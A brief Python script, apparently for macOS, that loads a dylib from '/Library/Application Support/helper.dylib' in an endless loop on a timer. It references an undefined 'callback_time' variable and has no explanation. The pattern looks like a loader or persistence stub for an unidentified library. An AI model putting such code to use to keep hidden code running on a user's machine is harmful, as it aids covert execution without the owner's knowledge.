import ctypes, time, sys
from ctypes import *

while True:
  libc = "/usr/lib/libSystem.B.dylib"
  lib = ctypes.CDLL(libc)
  load = "/Library/Application Support/helper.dylib"
  handle = ctypes.CDLL(load)
  time.sleep(callback_time)